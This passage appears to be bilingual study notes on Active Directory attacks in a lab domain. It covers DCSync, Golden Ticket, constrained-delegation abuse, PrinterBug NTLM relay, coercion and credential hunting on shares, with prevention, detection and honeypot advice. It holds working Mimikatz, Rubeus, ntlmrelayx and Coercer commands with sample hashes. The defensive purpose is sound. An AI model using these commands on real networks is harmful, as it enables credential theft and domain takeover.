Une strat√©gie avanc√©e de d√©tection consiste √† cr√©er un GPO leurre configur√© pour attirer un attaquant.
Conditions pour un honeypot GPO efficace :
Li√© √† des serveurs non critiques.
Suivi automatis√© et en temps r√©el des modifications.
D√©sactivation automatique en cas de d√©tection d'alt√©ration.
Script de d√©tection automatique (PowerShell)

Ce script PowerShell surveille un GPO honeypot sp√©cifique et d√©sactive tout utilisateur l‚Äôayant modifi√© :

P√©riode de surveillance : 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)
Recherche des √©v√©nements 5136 li√©s au GPO cible
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modifiedrn"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody += "Disabled user " + $log.Properties[3].Value + "r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Envoi d‚Äôun e-mail d‚Äôalerte (√† compl√©ter avec Send-MailMessage)
    $emailBody
}
Une d√©sactivation d√©clenche l'√©v√©nement 4725, indiquant qu‚Äôun compte a √©t√© d√©sactiv√©.

Recommandations strat√©giques

Les honeypots GPO doivent √™tre utilis√©s dans des environnements matures, dot√©s de capacit√©s de d√©tection et de r√©ponse rapide. Mal utilis√©s, ils peuvent devenir √©vidents pour les attaquants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Credentials in Shares</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-801c-bc8f-f5a0e261b33d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exposition des Identifiants dans les Partages R√©seau ‚Äì Description, Attaque, Pr√©vention et D√©tection
Contexte : Exposition des Identifiants sur les Partages R√©seau

L‚Äôexposition des identifiants dans les partages r√©seau est l‚Äôune des mauvaise configuration les plus courantes rencontr√©es dans Active Directory. Bien que ces erreurs surviennent fr√©quemment dans les grandes entreprises, elles peuvent aussi affecter des petites structures. Ce ph√©nom√®ne ressemble √† une √©volution de la probl√©matique des mots de passe laiss√©s sur des post-its, en passant √† ¬´ ne laissez pas de identifiants non chiffr√©s et de tokens d'autorisation √©parpill√©s sur le r√©seau ¬ª.

Les identifiants peuvent √™tre trouv√©s dans des scripts et fichiers de configuration sur des partages r√©seau (ex. : scripts batch, cmd, PowerShell, fichiers ini et config). Par contraste, les identifiants stock√©s sur les machines locales des utilisateurs se trouvent souvent dans des fichiers texte, Excel ou Word. Toutefois, la diff√©rence majeure r√©side dans le fait que les partages r√©seau repr√©sentent un risque beaucoup plus √©lev√© en raison de leur accessibilit√© potentielle pour tous les utilisateurs.
Pourquoi les Partages R√©seau sont-ils Expos√©s ?

Il existe plusieurs raisons pour lesquelles un partage r√©seau devient accessible √† tous :
Acc√®s trop large √† un partage initialement s√©curis√© :
   Un administrateur cr√©e un partage avec des restrictions appropri√©es, mais d'autres administrateurs finissent par √©tendre l'acc√®s √† "Tout le monde" (groupe "Users"), donnant ainsi acc√®s √† tous les utilisateurs du domaine.
Mauvaise gestion des partages de scripts :
   Parfois, un administrateur cr√©e un r√©pertoire pour tester des scripts sur le \C:\ ou dans un autre r√©pertoire partag√©, mais oublie de restreindre l‚Äôacc√®s, exposant ainsi des informations sensibles.
Partages ouverts par n√©gligence :
   Certains partages peuvent √™tre laiss√©s ouverts apr√®s une utilisation temporaire pour transf√©rer des fichiers ou installer des logiciels, puis ne sont pas ferm√©s apr√®s l‚Äôutilisation.
Partages cach√©s mal compris :
   Les partages cach√©s (nom de dossier se terminant par "\$") ne sont pas affich√©s dans l‚ÄôExplorateur Windows. Cependant, d‚Äôautres outils (comme PowerShell ou Command Prompt) peuvent y acc√©der et y trouver des informations sensibles.
Attaque

L'attaque commence par l'identification des partages r√©seau accessibles au sein du domaine. Des outils comme Invoke-ShareFinder de PowerView permettent de lister tous les partages disponibles et de v√©rifier les acc√®s en fonction des permissions de l'utilisateur.

Exemple d‚Äôutilisation de PowerView :

PS C:\Users\bob\Downloads&gt; Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
Exemple de sortie :

\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\Server01.eagle.local\dev$     -
L'attaquant peut alors rechercher des mots cl√©s comme "pass", "username", ou "password" dans les fichiers partag√©s √† l‚Äôaide de la commande findstr (outil int√©gr√© dans Windows) :

Commande PowerShell :

PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$&gt; findstr /m /s /i "pass" *.bat
Pr√©vention

La meilleure fa√ßon de pr√©venir cette attaque est de verrouiller l'acc√®s √† tous les partages r√©seau dans le domaine. Il est essentiel d‚Äôeffectuer des analyses r√©guli√®res (hebdomadaires) pour d√©tecter tout nouveau partage ouvert ou toute information sensible expos√©e dans un ancien partage.
Limiter les permissions sur les partages : Restreindre l'acc√®s √† seulement les utilisateurs n√©cessaires.
Audits r√©guliers : Planifier des scans fr√©quents des partages r√©seau pour v√©rifier leur s√©curit√©.
Utilisation de partages s√©curis√©s : √âviter d‚Äôutiliser des partages qui peuvent √™tre modifi√©s par des utilisateurs non autoris√©s.
D√©tection

La d√©tection d'une exploitation des identifiants expos√©s sur les partages se base sur l‚Äôanalyse du comportement des utilisateurs et la surveillance des √©v√©nements associ√©s √† l‚Äôutilisation des identifiants compromis.

√âv√©nements cl√©s √† surveiller :
Event ID 4624 : Connexion r√©ussie (connexion avec des identifiants expos√©s).
Event ID 4768 : Requ√™te de ticket TGT (Kerberos).

Analyser les connexions suspectes ou provenant de lieux inhabituels peut permettre de rep√©rer une exploitation des identifiants.
Honeypot

Une strat√©gie efficace pour d√©tecter l‚Äôexploitation des identifiants sur les partages consiste √† cr√©er un compte honeypot dans Active Directory.

Configuration id√©ale pour un compte honeypot :
Un compte de service cr√©√© il y a plus de 2 ans, avec un mot de passe non modifi√© depuis au moins un an.
Ce compte doit √™tre encore actif dans l'environnement, mais la mauvaise configuration de son mot de passe entra√Ænera principalement des tentatives de connexion √©chou√©es.

√âv√©nements associ√©s √† un compte honeypot :
4625 : Tentative de connexion √©chou√©e.
4771 : √âchec de l'authentification Kerberos.
4776 : √âchec de l'authentification NTLM.

Le suivi de ces tentatives peut alerter les administrateurs en cas de compromission des identifiants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Credentials in Object Properties</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80f5-819e-d135208eaf15"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exposition des Identifiants dans les Propri√©t√©s des Objets Active Directory ‚Äì Description, Attaque, Pr√©vention et D√©tection
Contexte : Storing Credentials in Object Properties in Active Directory

Dans Active Directory, chaque objet poss√®de de nombreuses propri√©t√©s, telles que :
L‚Äô√©tat du compte (actif/inactif),
La date d‚Äôexpiration du compte,
La date de la derni√®re modification du mot de passe,
Le nom du compte,
La localisation de l‚Äôemploy√©, son num√©ro de t√©l√©phone, etc.

Les administrateurs remplissent ces propri√©t√©s lors de la cr√©ation des comptes. Toutefois, une mauvaise pratique courante dans le pass√© √©tait d‚Äôajouter les mots de passe (ou d‚Äôautres informations sensibles) dans les propri√©t√©s Description ou Info des objets. Cette approche √©tait souvent motiv√©e par la croyance erron√©e que ces propri√©t√©s √©taient s√©curis√©es et r√©serv√©es √† une consultation uniquement par les administrateurs. Or, il est important de savoir que tous les utilisateurs du domaine peuvent lire la majorit√© des propri√©t√©s des objets, y compris Description et Info.
Attaque

Un attaquant peut facilement r√©cup√©rer des mots de passe stock√©s dans ces propri√©t√©s en utilisant un script PowerShell simple qui interroge le domaine pour rechercher des termes sp√©cifiques dans les propri√©t√©s Description ou Info des utilisateurs.

Exemple de script PowerShell :

Function SearchUserClearTextInformation {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms) {
        $list += "($.Description -like "$t")"
        $list += "($.Info -like "$t")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
Dans cet exemple, le script recherche le mot cl√© "pass" dans les propri√©t√©s Description et Info pour trouver les mots de passe en clair. Si un mot de passe est trouv√© dans un champ, le script retourne les informations de l‚Äôutilisateur.

Exemple d'ex√©cution du script :

PS C:\Users\bob\Downloads&gt; SearchUserClearTextInformation -Terms "pass"
SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 : 
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
Ici, le mot de passe Slavi123 est trouv√© dans le champ Description de l'utilisateur bonni.
Pr√©vention

Pour pr√©venir ce type de mauvaise configuration, voici quelques bonnes pratiques :
√âvaluations continues : Effectuer des √©valuations continues pour d√©tecter l‚Äô√©ventuelle pr√©sence de mots de passe dans les propri√©t√©s des objets d‚ÄôActive Directory.
Formation des employ√©s avec privil√®ges √©lev√©s : Former les administrateurs et les utilisateurs privil√©gi√©s pour √©viter de stocker des identifiants dans ces propri√©t√©s.
Automatisation de la cr√©ation des comptes utilisateurs : Automatiser autant que possible la cr√©ation des comptes utilisateurs pour √©viter que les administrateurs saisissent manuellement des informations sensibles, comme des mots de passe, dans les propri√©t√©s des objets.
D√©tection

La d√©tection de l'exploitation des informations sensibles dans les propri√©t√©s des objets peut √™tre r√©alis√©e via l‚Äôanalyse des comportements des utilisateurs. Cette m√©thode de d√©tection est plus efficace pour les comptes administratifs ou comptes de service, dont le comportement peut √™tre compris et surveill√©.

Les √©v√©nements √† surveiller incluent :
Event ID 4624 : Connexion r√©ussie, ce qui peut indiquer que les identifiants trouv√©s dans les propri√©t√©s des objets ont √©t√© utilis√©s.
Event ID 4625 : Tentative de connexion √©chou√©e, si l‚Äôattaquant tente d‚Äôutiliser les identifiants stock√©s en clair mais √©choue.
Event ID 4768 : Requ√™te Kerberos TGT, li√©e √† l‚Äôutilisation des identifiants dans l‚Äôenvironnement Kerberos.

Limite de la d√©tection : L‚Äô√©v√©nement Event ID 4738 (modification d‚Äôun objet utilisateur) ne permet pas d‚Äôidentifier directement quelles propri√©t√©s ont √©t√© modifi√©es ou les nouvelles valeurs des propri√©t√©s. Cela rend difficile la d√©tection d‚Äôajouts de mots de passe dans ces champs par les administrateurs.
Honeypot

Stocker des mots de passe dans les propri√©t√©s des objets peut √™tre une technique int√©ressante pour cr√©er un honeypot dans un environnement Active Directory qui n‚Äôa pas encore atteint un niveau de maturit√© en termes de gestion des identifiants.

Configuration du compte honeypot :
Le mot de passe est stock√© dans le champ Description, ce qui facilite sa d√©couverte par un attaquant.
Le mot de passe fourni est incorrect (cela permet de d√©tecter des tentatives de connexion √©chou√©es).
Le compte est activ√© et poss√®de des tentatives de connexion r√©centes.
Id√©alement, utilisez un compte de service, car les administrateurs ont tendance √† les cr√©er manuellement, contrairement aux comptes d‚Äôutilisateurs cr√©√©s par des syst√®mes automatis√©s (comme le syst√®me RH).
Le mot de passe de ce compte a √©t√© d√©fini il y a plus de 2 ans, ce qui le rend cr√©dible aux yeux d'un attaquant.

En raison du mot de passe incorrect, vous pouvez vous attendre √† voir des tentatives de connexion √©chou√©es, telles que :
Event ID 4625 : √âchec de connexion.
Event ID 4771 : √âchec de l‚Äôauthentification Kerberos.
Event ID 4776 : √âchec de la validation des identifiants NTLM.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">DCSync</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8025-9c0a-e642173cdba1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">DCSync Attack in Active Directory
Description

The DCSync attack allows attackers to impersonate a Domain Controller (DC) and perform replication with a targeted Domain Controller to extract password hashes from Active Directory (AD). This attack requires specific permissions, which are:
Replicating Directory Changes
Replicating Directory Changes All

These permissions enable the attacker to request password data from the AD environment, mimicking the behavior of a Domain Controller during replication.

The attack can be initiated by either a user or a computer, as long as the attacker has the necessary replication permissions assigned. This makes it a potent attack method for obtaining credential hashes from the AD environment, even without direct access to the domain controller itself.
Attack Process

Here is an example of how the DCSync attack works using Mimikatz, a popular tool for Windows post-exploitation:
Step 1: Set Up the Attacker User Account

First, the attacker needs to impersonate a user that has the Replicating Directory Changes and Replicating Directory Changes All permissions.
In this example, the user Rocky has the required permissions.
Rocky‚Äôs password is Slavi123.
Step 2: Start a Command Shell as the Attacker User

The attacker uses the runas command to launch a command shell as the user Rocky:

C:\Users\bob\Downloads&gt; runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
Step 3: Use Mimikatz to Perform DCSync

Once in the command shell, the attacker uses Mimikatz to dump password hashes. The attacker targets the Administrator account in this case:

C:\Mimikatz&gt; mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
This command initiates the DCSync attack against the Administrator user in the eagle.local domain.

Mimikatz Output Example:

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSSNEGOTIATE (9)

Object RDN           : Administrator

 SAM ACCOUNT 

SAM Username         : Administrator
Account Type         : 30000000 ( USEROBJECT )
User Account Control : 00010200 ( NORMALACCOUNT DONTEXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
In this example, the NTLM hash for the Administrator account is extracted. The hash is then used for potential further attacks, like pass-the-hash.
Optional: Dump All Hashes in AD

Alternatively, the attacker can use the /all parameter to dump the hashes of all user accounts in the Active Directory environment:

mimikatz # lsadump::dcsync /domain:eagle.local /all
This command would dump the NTLM hashes of every user in the domain, providing a broader attack surface for the attacker.
Prevention

Complete prevention of DCSync is challenging because the attack mimics standard replication operations within Active Directory. However, several mitigation measures can reduce the risk:
Limit Replication Permissions:
Restrict Replicating Directory Changes and Replicating Directory Changes All permissions to only trusted and necessary Domain Controllers.
Remove unnecessary accounts from these permissions, especially non-administrative or low-privileged accounts.
Use a RPC Firewall:
Implement a RPC Firewall to restrict replication requests to only trusted Domain Controllers. This can help block unauthorized replication attempts from non-DC systems.
Use Managed Service Accounts (MSAs):
Use Managed Service Accounts (MSAs) instead of regular service accounts. MSAs reduce the need for manually managing credentials, which lowers the likelihood of exposing replication permissions to non-DC systems.
Use Strong Authentication:
Implement strong authentication mechanisms such as multi-factor authentication (MFA) for accounts that have replication privileges.
Detection

Detecting DCSync is possible by monitoring for specific events that are generated during the replication process. The following are important steps for detection:
Monitor Event ID 4662:
This event is generated whenever a replication attempt is made on a Domain Controller.
The event logs will contain information about the account initiating the replication and the object being replicated.
Look for Replication Attempts:
When an attacker uses DCSync, Event ID 4662 will log details of the replication attempt.
Be on the lookout for unexpected replication requests from non-DC systems.
Whitelist Trusted Systems:
To reduce false positives, configure event monitoring systems to whitelist systems that legitimately need replication, such as Azure AD Connect or trusted Domain Controllers.

Example of Event ID 4662 (Unauthorized DCSync Attempt):

Event ID: 4662
Account Name: rocky
Object Name: DC2.eagle.local
Object Type: user
Access Mask: Replicate Directory Changes All
This event may indicate a DCSync attempt, particularly if the account initiating the replication is not authorized to perform this action.
Conclusion

The DCSync attack is a highly effective method for attackers to extract password hashes from Active Directory by impersonating a Domain Controller and performing replication. The attack relies on having the necessary replication permissions assigned to the attacker‚Äôs account, which may be inadvertently granted due to misconfigurations.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Golden Ticket</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80af-b186-d52dfc7c6d26"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Kerberos Golden Ticket Attack
Description

The Kerberos Golden Ticket is a highly impactful attack that allows attackers to create or forge valid Kerberos tickets (TGTs) for any user in the domain. By exploiting the krbtgt account (which is responsible for signing all Kerberos tickets in Active Directory), attackers can forge these tickets and impersonate any user, including privileged accounts like Domain Admins.

In a Kerberos authentication setup, the krbtgt account is critical because its password hash is used by the Key Distribution Center (KDC) to sign all Kerberos tickets. An attacker with access to the hash of this password can create valid Kerberos TGTs, enabling the attacker to authenticate as any user in the domain, including those with domain-wide privileges.

The Golden Ticket attack is typically performed after the attacker has gained Domain Admin or equivalent privileges, allowing them to generate a persistent, high-level foothold in the domain.
Attack Overview
Targeting the krbtgt Account:
The krbtgt account is automatically created when a domain is set up. Its password is used by the KDC to sign Kerberos tickets.
This account is disabled by default, but it cannot be deleted, renamed, or enabled.
Possession of the krbtgt password hash enables an attacker to generate legitimate Kerberos TGTs.
Escalating Privileges:
With the Golden Ticket, an attacker can impersonate any user in the domain, including users from other domains in the forest.
The attacker can escalate privileges from a child domain to a parent domain, giving them access to the entire forest.
Persistent Access:
The Golden Ticket provides long-term persistence in the domain, allowing the attacker to maintain access even after their original compromise is detected and remediated.
Steps to Perform the Golden Ticket Attack

Step 1: Obtain the krbtgt Hash and SID

The first step is to obtain the krbtgt password hash and the domain SID. This can be achieved using tools like Mimikatz and DCSync.
Use DCSync to dump the krbtgt hash and domain SID:

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
Mimikatz Output Example:

SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
The krbtgt hash (in this example: db0d0630064747072a7da3f7c3b4069e) is required for the Golden Ticket, as is the domain SID (S-1-5-21-1518138621-4282902758-752445584).

Step 2: Generate the Golden Ticket

Once the krbtgt hash and domain SID are obtained, the attacker can use Mimikatz to create a forged Kerberos Ticket Granting Ticket (TGT). The kerberos::golden command is used to generate the ticket.

Example command:

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
Where:
/domain: Specifies the domain name (e.g., eagle.local).
/sid: Specifies the domain SID obtained from the previous step.
/rc4: The NTLM hash of the krbtgt account.
/user: The username for which the Golden Ticket is being created (e.g., Administrator).
/id: The Relative ID (RID) of the user (e.g., 500 for Administrator).
/renewmax: The maximum number of days the ticket can be renewed (e.g., 7).
/endin: The expiration date/time for the ticket (e.g., 8 for 8 days).
/ptt: Places the forged ticket into the current ticket cache (useful for immediate use).

Step 3: Verify the Golden Ticket

Once the ticket is created, it can be verified using the klist command to see if the Golden Ticket has been properly added to the Kerberos ticket cache:

C:\Mimikatz&gt; klist
If the Golden Ticket was successfully created, you should see the forged TGT listed in the output.
Prevention

Preventing the Golden Ticket attack is difficult because it leverages the inherent trust in Kerberos tickets. However, the following steps can mitigate the attack:
Block Privileged Users from Authenticating to Non-Essential Devices:
Restrict privileged users from authenticating to any device that does not require their credentials, reducing the chances of their credentials being used for Golden Ticket generation.
Periodically Reset the krbtgt Password:
Regularly changing the krbtgt account password can limit the window of opportunity for attackers to exploit a compromised hash.
It is recommended to reset the krbtgt password twice, with at least 10 hours between resets, to clear any old hashes.
Enforce SIDHistory Filtering:
Enabling SIDHistory filtering can prevent attackers from using SIDHistory attributes for cross-domain escalation (i.e., moving from a child domain to a parent domain).
Implement Monitoring and Alerting for Unusual Authentication Activity:
Monitor for suspicious Kerberos activity such as multiple requests for TGTs without prior TGS (Ticket Granting Service) requests, which may indicate a Golden Ticket.
Detection
Monitor Event ID 4624 and 4625 for Suspicious Logons:
These event IDs capture both successful and failed logon attempts. Monitor for logons from unusual or unexpected accounts, especially Administrator and other high-privileged accounts.
Look for TGS Requests Without a Prior TGT:
TGS requests that occur without a valid TGT may indicate the presence of a Golden Ticket.
Monitor for Event ID 4675 if SIDHistory Filtering is Enabled:
This event indicates cross-domain escalation, which can be caused by a Golden Ticket being used to impersonate an account from another domain.
Check for Golden Ticket Usage:
Look for evidence of forged TGTs in the Kerberos ticket cache using tools like klist.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Kerberos Constrained Delegation</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80c2-92d0-fc4b0b69a612"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Description

Kerberos Delegation permet √† une application d'acc√©der √† des ressources sur un autre serveur au nom d'un utilisateur, sans que cet utilisateur n'ait un acc√®s direct. Par exemple, un compte de service pour un serveur web peut √™tre d√©l√©gu√© pour acc√©der √† une base SQL, ce qui permet aux utilisateurs d'interagir avec les donn√©es sans avoir de droits directs sur la base.
Types de d√©l√©gation Kerberos dans Active Directory :
Unconstrained Delegation (non restreinte)
La plus permissive. Permet au compte d√©l√©gu√© d'acc√©der √† n‚Äôimporte quel service.
Constrained Delegation (restreinte)
Limite les services auxquels le compte peut se d√©l√©guer, d√©fini dans les attributs de l‚Äôutilisateur.
Resource-Based Constrained Delegation
Moins utilis√©e, elle est configur√©e au niveau de l‚Äôobjet machine cible.
Toutes les formes de d√©l√©gation repr√©sentent un risque potentiel de s√©curit√©. Elles doivent √™tre √©vit√©es sauf n√©cessit√© absolue.

Attaque : Abus de la D√©l√©gation Restreinte (Constrained Delegation)

Quand un compte est configur√© pour une d√©l√©gation restreinte, il peut demander des tickets Kerberos pour d‚Äôautres comptes afin d'acc√©der √† des services sp√©cifiques.
√âtapes de l‚Äôattaque :
Identifier les comptes configur√©s pour la d√©l√©gation :

Get-NetUser -TrustedToAuth
Exemple de r√©sultat :

distinguishedname       : CN=web service,CN=Users,DC=eagle,DC=local
msds-allowedtodelegateto: {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
useraccountcontrol      : TRUSTEDTOAUTHFORDELEGATION
R√©cup√©rer le hash NTLM du mot de passe compromis (ex: Slavi123) :

.\Rubeus.exe hash /password:Slavi123
Sortie :

rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
Impersonner l‚Äôutilisateur ‚ÄòAdministrator‚Äô et injecter le ticket Kerberos :

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
V√©rifier l‚Äôinjection du ticket avec klist :

klist
Ouvrir une session distante sur le DC avec les droits de l‚ÄôAdministrator :

Enter-PSSession dc1
Pr√©vention
Activer l‚Äôoption "Account is sensitive and cannot be delegated" pour les comptes √† privil√®ges.
Ajouter les comptes critiques au groupe "Protected Users", qui emp√™che toute forme de d√©l√©gation.
Mettre en place une politique de mot de passe robuste pour √©viter les attaques de type Kerberoasting.

D√©tection
Surveiller les connexions suspectes √† l‚Äôaide de l‚ÄôEvent ID 4624 (logon r√©ussi).
Inspecter le champ Transited Services dans les journaux pour identifier les processus de logon de type S4U (Service for User).</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Print Spooler &amp; NTLM Relaying</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80dd-a212-dcbf39da7d97"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Print Spooler Exploitation (PrinterBug)
Description

The Print Spooler service, enabled by default even in modern Windows systems, became a critical attack vector after the discovery of "PrinterBug" by Lee Christensen in 2018.

This bug leverages the functions RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx to force a remote machine to authenticate to an attacker-controlled system, sending Kerberos TGTs that can be relayed or harvested.
Microsoft classified this issue as ‚Äúby-design‚Äù and did not release a patch.

Impact

If a Domain Controller (DC) runs the Print Spooler service, an attacker can:
Relay the DC‚Äôs connection to another DC to perform DCSync, assuming SMB signing is disabled.
Force the DC to connect to a server with Unconstrained Delegation, allowing TGTs to be cached and extracted with tools like Mimikatz or Rubeus.
Relay authentication to Active Directory Certificate Services (AD CS) to obtain a valid certificate impersonating the DC.
Abuse the connection to configure Resource-Based Delegation, enabling further privilege escalation.

Attack Methodology

This example demonstrates NTLM relay to perform DCSync by redirecting the DC‚Äôs Print Spooler request to another DC.
Step-by-Step:
Start NTLMRelayx, targeting the second DC (DC2):

impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
Sample Output:

[] Servers started, waiting for connections
Trigger the PrinterBug using Dementor to make the first DC (DC1) authenticate to us:

python3 dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
Expected Output (even with RPC errors, the relay may succeed):

[] bound to spoolss
[*] getting context handle...
[-] exception RPRN SessionError: code: 0x6ab - RPCSINVALIDNETADDR
Check NTLMRelayx output ‚Äì if successful, DCSync will return NTLM hashes of domain users, including privileged accounts.

Prevention
Disable Print Spooler on all critical servers (especially DCs):
Use Group Policy or PowerShell:

     Stop-Service spooler
     Set-Service spooler -StartupType Disabled
     Registry Hardening ‚Äì prevent remote RPC endpoint use:
Key: HKLM\System\CurrentControlSet\Control\Print
Value: RegisterSpoolerRemoteRpcEndPoint
1: Enabled
2: Remote access disabled
Enforce SMB Signing on DCs to prevent NTLM relays.

Detection
While PrinterBug attacks don't generate event ID 4662 (typically used for DCSync detection), they may still be spotted by:
Event ID 4624 ‚Äì look for suspicious successful logons on DCs from unusual IPs.
Network connection logs ‚Äì monitor outbound connections from DCs on ports 445 and 139.

Honeypot Strategy

You can deploy PrinterBug as a honeypot to detect lateral movement or exploitation attempts:
Block outbound SMB traffic from servers (139/445) and alert on attempts.
Set traps using decoy servers with Print Spooler enabled and monitor connections.
Use honeypots only if your blue team can respond quickly‚Äîthey work best in mature security environments.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Coercing Attacks &amp; Unconstrained Delegation</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-803e-b35a-dd1a444b3769"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Coercing Attacks in Active Directory
Description

Coercion attacks are a class of privilege escalation techniques in Active Directory where an attacker forces one system (usually a privileged one like a Domain Controller) to authenticate to an attacker-controlled machine. This allows credential theft or ticket manipulation.

Although PrinterBug is the most well-known example, tools like Coercer now support a wide range of vulnerable RPC functions for this purpose, significantly broadening the attack surface.
Most AD environments are vulnerable by default unless hardened specifically.

Impact

Once a coercion path is successful, the attacker can pivot to various post-exploitation techniques:
Relay to another DC and perform DCSync, if SMB signing is disabled.
Coerce a DC to connect to a server with Unconstrained Delegation (UD) and capture Kerberos TGTs.
Relay to AD Certificate Services to obtain a forged certificate (usable for DCSync or lateral movement).
Abuse Resource-Based Delegation (RBCD) to impersonate users on target systems.

Attack Walkthrough: Capturing a TGT via Coercer
Identify Unconstrained Delegation Hosts

Use PowerView to list machines with Unconstrained Delegation enabled:

Get-NetComputer -Unconstrained | Select samaccountname
Example Output:

samaccountname

DC1$
SERVER01$
WS001$
DC2$
Monitor for TGTs on a Compromised UD Machine

On WS001, run Rubeus to monitor incoming tickets:

.\Rubeus.exe monitor /interval:1
Sample Output:

[] 18/12/2022 22.37.09 UTC - Found new TGT:
User         : bob@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.09
Trigger Coercion with Coercer

On the attacker machine (e.g., Kali), use Coercer:

Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
Expected Output:

[&gt;] Pipe '\PIPE\lsarpc' is accessible!
[&gt;] Pipe '\PIPE\spoolss' is accessible!
[+] All done!
Capture the Domain Controller's TGT

Rubeus on WS001 will now detect the DC‚Äôs TGT:

[] 18/12/2022 22.55.52 UTC - Found new TGT:
User         : DC1$@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.21
Use the TGT for Authentication

Inject the ticket with Rubeus:

.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
Then, dump credentials using Mimikatz:

.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
Prevention

Because Windows doesn‚Äôt natively restrict coercion vectors, prevention requires proactive controls:
Deploy a Third-Party RPC Firewall
   Example: [Zero Networks RPC Firewall](https://github.com/zeronetworks/rpcfirewall)
Audit or block dangerous RPC functions
Custom blocklists for OPNUMs
Block Outbound Ports 139 and 445
Especially from Domain Controllers and sensitive servers
Prevents coercion responses from reaching attackers

Detection

Detection is challenging, but possible through network and firewall monitoring:
Firewall Log Analysis
Watch for outbound SMB connections (139/445) from core servers
Especially unexpected traffic to non-trusted machines
Dropped Traffic as an Alert Signal
If port blocking is in place, dropped connections can indicate attack attempts
Third-Party Monitoring Tools
The RPC Firewall mentioned above provides robust detection features for these attack vectors.

Final Notes
Coercion is not a vulnerability, but a design issue‚Äîand highly effective.
Combining RPC firewalling with network egress restrictions significantly improves defenses.
